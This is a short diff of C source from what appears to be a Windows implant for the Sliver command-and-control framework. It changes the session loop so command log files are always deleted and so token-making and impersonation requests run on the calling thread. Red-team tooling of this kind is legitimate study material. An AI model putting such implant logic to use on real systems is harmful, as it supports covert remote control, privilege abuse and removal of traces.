@@ -223,9 +223,9 @@ VOID SessionWork
 			else {
 				pSendEnvelope = CreateErrorRespEnvelope("Failed to execute command (Unknown Error)", 9, pRecvEnvelope->uID);
 			}
-
-			DeleteFileW(wszLogName);
 		}
+
+		DeleteFileW(wszLogName);
 	}
 	else {
 		pSendEnvelope = ALLOC(sizeof(ENVELOPE));
@@ -331,8 +331,13 @@ VOID SessionMainLoop
 			pWrapper = ALLOC(sizeof(SESSION_WORK_WRAPPER));
 			pWrapper->pSession = pSession;
 			pWrapper->pEnvelope = pEnvelope;
-			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
-			TpPostWork(pWork);
+			if (pEnvelope->uType == MsgMakeTokenReq || pEnvelope->uType == MsgRevToSelfReq || pEnvelope->uType == MsgImpersonateReq) {
+				SessionWork(NULL, pWrapper, NULL);
+			}
+			else {
+				pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)SessionWork, pWrapper, &pSliverPool->CallBackEnviron);
+				TpPostWork(pWork);
+			}
 		SLEEP:
 			Sleep(pSession->dwPollInterval * 1000);
 		}
